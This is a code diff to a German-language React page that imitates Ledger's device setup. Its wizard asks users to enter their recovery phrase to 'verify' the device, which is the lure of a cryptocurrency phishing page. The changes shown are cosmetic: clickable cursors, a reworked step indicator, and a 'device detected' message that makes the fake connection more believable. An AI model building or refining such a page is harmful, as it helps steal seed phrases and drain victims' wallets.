@@ -32,7 +32,7 @@ const devices: { name: string; short: string; svg: (p: IconProps) => React.React
 type View = "select" | "connecting" | "detected" | "wizard";
 
 const primaryButton =
-  "rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all duration-300 hover:scale-105 hover:bg-white hover:shadow-[0_0_25px_rgba(167,139,250,0.6)]";
+  "cursor-pointer rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-all duration-300 hover:scale-105 hover:bg-white hover:shadow-[0_0_25px_rgba(167,139,250,0.6)]";
 
 function LedgerPage() {
   const [view, setView] = useState<View>("select");
@@ -108,7 +108,7 @@ function SelectView({ onPick }: { onPick: (idx: number) => void }) {
             key={name}
             type="button"
             onClick={() => onPick(i)}
-            className="group flex flex-col items-center justify-center rounded-2xl border border-white/10 bg-[#13131a] p-8 transition-all hover:border-[#a78bfa] hover:bg-[#1a1a24]"
+            className="group flex cursor-pointer flex-col items-center justify-center rounded-2xl border border-white/10 bg-[#13131a] p-8 transition-all hover:border-[#a78bfa] hover:bg-[#1a1a24]"
           >
             <div className="mb-5 flex h-32 items-center justify-center">
               <Icon />
@@ -142,7 +142,7 @@ function ConnectingView({ device }: { device: { name: string; short: string; svg
       <div className="mt-6 flex items-center gap-3 text-gray-300">
         <Loader2 className="h-5 w-5 animate-spin text-[#a78bfa]" />
         <span>
-          verbinde<span className="inline-block w-6 text-left">{".".repeat(dots)}</span>
+          <span className="text-[#a78bfa]">{device.short}</span> erkannt - verbinde<span className="inline-block w-6 text-left">{".".repeat(dots)}</span>
         </span>
       </div>
     </div>
@@ -180,13 +180,6 @@ function WizardView({
       <div className="mt-12 w-full">
         {step === 1 && (
           <div className="flex flex-col items-center">
-            <div className="mb-4">
-              <svg width="36" height="36" viewBox="0 0 30 30" fill="none">
-                <circle cx="15" cy="15" r="10" stroke="#a78bfa" strokeWidth="2" />
-                <line x1="15" y1="8" x2="15" y2="16" stroke="#a78bfa" strokeWidth="2" strokeLinecap="round" />
-                <circle cx="15" cy="20" r="1.5" fill="#a78bfa" />
-              </svg>
-            </div>
             <h2 className="text-2xl font-semibold text-white">Gerät verifizieren</h2>
             <p className="mt-3 max-w-xl text-gray-400">
               Verifiziere dein Ledger-Gerät, indem du deine Recovery-Phrase eingibst, damit wir die Echtheit deines Geräts bestätigen können.
@@ -229,16 +222,16 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
     { n: 3, label: "Bestätigung" },
   ] as const;
   return (
-    <div className="mx-auto flex w-full max-w-xl items-start justify-between">
+    <div className="mx-auto flex w-full max-w-xl items-center justify-center">
       {steps.map((s, i) => {
         const active = step === s.n;
         const done = step > s.n;
         return (
-          <div key={s.n} className="flex flex-1 items-start">
-            <div className="flex flex-1 flex-col items-center gap-2">
+          <div key={s.n} className="flex items-center" style={{ flex: i === steps.length - 1 ? "0 0 auto" : "1 1 0" }}>
+            <div className="relative flex w-10 shrink-0 flex-col items-center">
               <div className="relative flex h-10 w-10 items-center justify-center">
                 {active && (
-                  <div className="absolute inset-0 -m-2 animate-pulse rounded-full bg-[#a78bfa]/60 blur-xl" />
+                  <div className="absolute inset-0 -m-1 rounded-full bg-[#a78bfa]/40 blur-lg" />
                 )}
                 <div
                   className={`relative flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
@@ -253,7 +246,7 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
                 </div>
               </div>
               <span
-                className={`text-xs sm:text-sm ${
+                className={`absolute top-12 w-40 text-center text-xs sm:text-sm ${
                   active ? "text-[#a78bfa] font-medium" : done ? "text-[#a78bfa]/80" : "text-gray-500"
                 }`}
               >
@@ -261,7 +254,7 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
               </span>
             </div>
             {i < steps.length - 1 && (
-              <div className={`mt-5 h-px w-full flex-1 ${step > s.n ? "bg-[#a78bfa]" : "bg-white/10"}`} />
+              <div className={`mx-2 h-px flex-1 ${step > s.n ? "bg-[#a78bfa]" : "bg-white/10"}`} />
             )}
           </div>
         );
